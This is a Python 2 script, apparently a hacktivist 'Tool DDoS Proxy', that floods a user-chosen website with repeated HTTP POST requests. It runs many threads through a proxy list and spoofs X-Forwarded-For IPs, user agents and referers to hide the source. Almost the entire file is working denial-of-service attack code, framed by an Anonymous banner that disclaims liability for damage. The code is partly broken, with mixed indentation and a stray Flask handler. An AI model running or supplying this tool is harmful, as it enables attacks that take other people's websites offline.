#!/usr/bin/env python
#coding: utf8
#Tool DDoS Proxy by SGDvsDT

import os
import random
import socket
import threading
import time
from random import randrange
from threading import Lock
from threading import Thread

host = "host_url"

userAgents = [
"Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I9305T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.2.2; my-mm; GT-M6a Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00F Build/KVT49L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.141 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; I9192 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; Android 4.2.2; GT-P5100 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.3; SM-G7102 Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.2.2; Galaxy S4 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; en-us; SM-N900A Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.4; XT1097 Build/KXE21.187-45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.117 Mobile",
"Mozilla/5.0 (Linux; Android 4.4.4; XT1097 Build/KXE21.187-30.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile",
"Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Lenovo A369i Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; Android 4.3; D2305 Build/18.0.A.1.30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-gb; LG-D802 Build/KOT49I.D80220c) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.2.2; vi-vn; mobiistar touch BEAN 402c Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; XT1080 Build/SU4.21) AppleWebKit/537.16 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.16",
"Mozilla/5.0 (Linux; U; Android 4.3; en-ca; HUAWEI G6-L11 Build/HuaweiG6-L11) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; Android 4.1.2; LG-F160L Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; SonyC1505 Build/11.3.A.2.23) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.2.2; th-th; HUAWEI Y511-U30 Build/HUAWEIY511-U30) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Series40; Nokia2700c/09.98; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27",
"Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2194.2 Safari/537.36",
"Mozilla/5.0 (X11; Linux i686; rv:6.0.2) (Q7sip7ZS4Ba8FkDSOvRNleYM4KEG59V8+uT/RC1tW0U=) Gecko/20100101 Firefox/6.0.2",
"Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; NOKIA; Lumia 925; ANZ892) like Gecko",
"Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 925; ANZ892) like Gecko",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; ; CJPMS_AAPCA4157828C9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.14 Safari/537.17",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2194.2 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0 FirePHP/0.7.4",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/38.0.2125.59 Mobile/12A365 Safari/600.1.4",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.99 Safari/537.22",
"Mozilla/5.0 (iPod touch; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.7 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36 OPR/25.0.1614.50",
"Mozilla/5.0 (X11; CrOS x86_64 6158.64.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.108 Safari/537.36",
"Mozilla/5.0 (Linux ia32) node.js/0.10.32 v8/3.14.5.9",
"Mozilla/5.0 (compatible; Googlebot/4.1; en-US rv:9.3.7) Firefox/32.5",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) ",
"Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0;  http://www.beslist.nl/)",
"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable)",
"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable)",
"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2)",]
 
reFerers = [
		"http://validator.w3.org/check?uri=",
		"https://www.facebook.com/l.php?u=",
		"https://drive.google.com/viewerng/viewer?url=",
		"http://www.google.com/translate?u=",
		"https://plus.google.com/share?url="
		"http://www.google.com/?q=",
		"https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
		"https://drive.google.com/viewerng/viewer?url=",
		"http://www.google.com/translate?u=",
		"https://developers.google.com/speed/pagespeed/insights/?url=",
		"http://help.baidu.com/searchResult?keywords=",
		"http://www.bing.com/search?q=",
		"https://add.my.yahoo.com/rss?url=",
		"https://twitter.com/search?q=",
		"https://play.google.com/store/search?q=",
		"https://www.facebook.com/l.php?u=",
		"https://drive.google.com/viewerng/viewer?url=",
		"http://www.google.com/translate?u=",
		"http://louis-ddosvn.rhcloud.com/f5.html?v=",
		"https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
		"http://www.google.com/?q=",
		"https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
		"https://drive.google.com/viewerng/viewer?url=",
		"http://www.google.com/translate?u=",
		"https://developers.google.com/speed/pagespeed/insights/?url=",
		"http://help.baidu.com/searchResult?keywords=",
		"http://www.bing.com/search?q=",
		"https://add.my.yahoo.com/rss?url=",
		"https://twitter.com/search?q=",
		"https://play.google.com/store/search?q="
		"https://plus.google.com/share?url=" ]
		
def randomIp():
        random.seed()
        result = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "."
        result = result + str(random.randint(1, 254)) + "." + str(random.randint(1, 254))
        return result
def generateip():
        notvalid = [10, 127, 169, 172, 192]
        first = randrange(1, 254)
        while first is notvalid:
            first = randrange(1, 254)
        _ip = ".".join([str(first), str(randrange(1, 254)),
        str(randrange(1, 254)), str(randrange(1, 254))])
        return _ip
def randomIpList():
    random.seed()
    res = ""
    for ip in xrange(random.randint(2, 8)):
        res = res + randomIp() + generateip() + ", "
    return res[0:len(res) - 2]
 
#def randomUserAgent():
    #return random.choice(userAgents)

#def randomReFerer():
    #return random.choice(reFerers)  
#before_request
def before_request():
    if request.url.startswith('http://'):
        url = request.url.replace('http://', 'https://', 1)
        code = 301
        return redirect(url, code=code)					
class attacco(threading.Thread):
    def run(self):
        current = x
       
        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = random.choice(listaproxy).split(':')
 
		#useragent = "User-Agent: " + randomUserAgent() + "\r\n"
	useragent = "User-Agent: " + random.choice(zombie) + "\r\n"
	forward   = "X-Forwarded-For: " + randomIpList() + generateip() + "\r\n"
	#referer   = "Referer: "+ randomReFerer() + url + "?r="+ str(random.randint(1000, 10000)) + "\r\n"
	referer   = "Referer: "+ random.choice(Bot) + url + "?r="+ str(random.randint(10000, 50000)) + "\r\n"
	httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"
 
        while nload:
            time.sleep(0.5)
           
        while 1:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.send(httprequest)
                try:
                    for i in xrange(13):
                        a.send(httprequest)
                except:
                    tts = 1
 
                   
            except:
                proxy = random.choice(listaproxy).split(':')
 
#Main
os.system("color 0a")

print "STARTING     .....        "

print "[                    ] 0% "
time.sleep(1)
print "[=====               ] 25%"
time.sleep(0.5)
print "[=======             ] 40%"
time.sleep(0.1)
print "[============        ] 60%"
time.sleep(0.4)
print "[=================   ] 85%"
time.sleep(0.35)
print "[====================] 100%"
time.sleep(0.2) 

print'                                                   '
print' _________________________________________________ '
print'|..."WE ARE NOT LIABLE FOR THE DAMAGE YOU CAUSE"..|'
print'|..."Tool DDoS use Proxies by SGDvsDT."...........|'
print'|..."We are Anonymous."...........................|'
print'|..."We do not forgive."..........................|'
print'|..."We do not forget."...........................|'
print'|..."Expect us!"..................................|'
print'|_________________________________________________|'
print'  .         . . ... .,~?I777?=,. . ... . .'
print'             .... :+ZO$I?I??I$OOI~.  .  .'  
print'          . ..  :7OI~....  .. .~IOZ+. .. .'
print'          ... ,7O+..   .......  ..=O$: .'  
print'          ... ,7O+..   .......  ..=O$: .' 
print'       ...  .~OI    ......   ....  .?D= . ...' 
print'       .....+O~ ....      .     ..   :87......'
print'       ... ?O... .. ... .... ...  ...  O$.....'  
print'      ...+O....... ..,,,,:,,,.. .. ....O7.....'  
print'   .  .  ~O,  .+...,,,,,,,,,,,,,, ..=, . 8? .. ..'
print'     . ..Z~..=NI..,, ...,.,. ,: ,:. +M?..:8~ .   .'
print'  . ..  I7.=?MZ..:,,..., .. , .,.,,..7MI? IZ.. . .'
print'  . .. :O IZ88, ,...:,.,,=I~.,,:,. :..ZN$$ O+ ...'
print'   ... 7+.D$7I:,, .,..,,?$7D., .,...,,II$N,=O . .'
print'   .  ,Z:ID=OZ.,. ...., ,:$7 ,..,,  ,,I8~87:O~.  .'
print'  . . +II$88Z,.,..,.. ,. ,+ ...  :.,.,.$D8$7?$....'
print'  . . $~O7NZ=.,  ,,,.,:,.::..:,,:,,....~7M78:8  .'
print'    ..$,D$?O?.,  ., .,,:.7O ,,,..... ..+OI7N.O~. .'
print'  .. :$ D7$N., ..,.. ., .::. ..  .,..., 88?M.7? ..'
print'  . .=7=8NM~.,   . . ,,. .. .., ..,. .,.:DN8+7I..'
print'   . .=7=8NM~.,   . . ,,. .. .., ..,. .,.:DN8+7I..'
print'  .. ??O7$$7 ,,..,, .,+D.+7.OI...,:,....?$$I8?$ ..'                                      
print'  . .?+$8=M+.,.  , ?$DMO.=? 7M8I+,,. ., :M+$8+$. .'
print'   . ??~MIM. , ...~MMMMO ~? $MMMMZ.   ..,D7N++Z  .'
print'     =7:8MZ?.,. . ?MMMM8 ?8 ZMMMMD, ..,.=$NN~II .'
print'   . ~$I+MIO:...  ZMMMMM.ID NMMMMN,. .,.O?M?IZ+ .'
print'  . ..7$$I7D~.,..,OMMMMM=ID=MMMMMM:..,.,N7I7$Z~ ..'
print'   . .7+M$=M+ ,,. NMMMMMOZNZMMMMMM~.., =M?IM?O...'
print'  . . ???M7D$+ , ~MMMMMMMNMMMMMMMM? ,.=7NIM$?$ ..'
print'   .  .,Z:OMM7O:..+MMMMMMMMMMMMMMMM?.,.OIMM8:Z= .'  
print'    .. .7?7IN$O7 .?MMMMMMMMMMMMMMMM$. ?87MIIIZ....'
print'   . .. ,$IN7+IN:.IMMMMMMMMMMMMMMMM$.,D$+7D7$+ . ..'
print'   .  ...7?7MD?N7?7MMMMMMMMMMMMMMMMZ?7N?OMZ+O.. .' 
print'   . . . .O:+NMNNZNMMMMMMMMMMMMMMMMMZ8MNNI,D~ . . .'
print'    .  .. ~Z:7IIZ+$MMMMMMMMMMMMMMMMZ=OI?$:O?. . . .'
print'    . . .. ?Z+D8OZZMMMMMMMMMMMMMMMMZOZON+7$, ..  .'
print'    . .  . .?$,$8OZ?+NMMMMMMMMMMO+?ZZ8$,7Z. ...  .'
print'   .   ..  ..+O,+?+$NMMMMMMMMMMMMNZ?+?:Z$  ..    .' 
print'     . ..  . .~8I78NDMMMMMMMMMMMDOMD$ID+ .. .  .' 
print'     .   .. ,. ,7$= =MMMMMMMMMMMO .~$O:.... ....'  
print'   . ... .  . . .:$ZOMMMMMMMMMMMD?OO+ .. . .    . .'

# Site/IP
url = raw_input(">Site: ")
host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
port = input('>port: ')
#Zombie
in_file = open(raw_input(">Zombie: "),"r")
zombie = in_file.read()
#Bot
in_file = open(raw_input(">Bot: "),"r")
Bot = in_file.read()
#Proxy
in_file = open(raw_input(">Proxy: "),"r")
proxyf = in_file.read()
in_file.close()
listaproxy = proxyf.split('\n')
#Dame
thread = input(">DAME(750): ")
#Attack
get_host = "POST " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
accept = "Accept-Encoding: gzip, deflate\r\n"
connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
nload = 1
x = 0

for x in xrange(int(thread + 1)):
		attacco().start()
		time.sleep(0.0000000000000000000001)
		print "#~~~>DoS: " + str(random.randint(1000, 99999)) + "<~~~#" + "!"

print '---------------------------------------------------------- '
print "Prepare for LULz! ..."
print '---------------------------------------------------------- '
nload = 0
while not nload:
	time.sleep(1)
	
